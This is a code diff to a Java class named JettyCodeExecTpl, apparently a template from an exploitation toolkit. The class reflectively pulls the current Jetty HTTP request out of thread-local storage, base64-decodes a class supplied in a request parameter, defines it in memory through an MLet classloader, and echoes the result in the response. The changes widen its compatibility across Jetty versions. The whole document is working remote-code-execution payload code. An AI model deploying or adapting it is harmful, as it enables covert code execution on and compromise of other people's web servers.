@@ -11,11 +11,11 @@ public class JettyCodeExecTpl {
         return "code";
     }
 
-    public JettyCodeExecTpl(){
+    public JettyCodeExecTpl() {
         run();
     }
 
-    public void run(){
+    public void run() {
         try {
             Thread thread = Thread.currentThread();
             Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
@@ -36,17 +36,24 @@ public class JettyCodeExecTpl {
                 obj = Array.get(table, i);
                 if (obj != null) {
                     httpConnection = valueField.get(obj);
-                    if (httpConnection != null && httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
+                    if (httpConnection != null && (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection") || httpConnection.getClass().getName().contains("HttpConnection"))) {
                         break;
                     }
                 }
             }
+            Object response;
+            Object request;
+            try {
+                Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
+                response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
+                request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
+            } catch (Exception e) {
+                response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
+                request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
+            }
 
-            Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
-            Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
             String code = (String) request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, getReqParamName());
-            if(code != null && code != ""){
-                Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
+            if (code != null && code != "") {
                 PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                 writer.write(exec(code));
                 writer.flush();
@@ -54,7 +61,8 @@ public class JettyCodeExecTpl {
             }
 
 
-        }catch (Exception e){
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -64,7 +72,7 @@ public class JettyCodeExecTpl {
             byte[] clazzByte = base64Decode(var2);
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
+            Class clazz = (Class) defineClass.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), clazzByte, 0, clazzByte.length);
             return clazz.newInstance().toString();
         } catch (Exception e) {
             return e.getMessage();
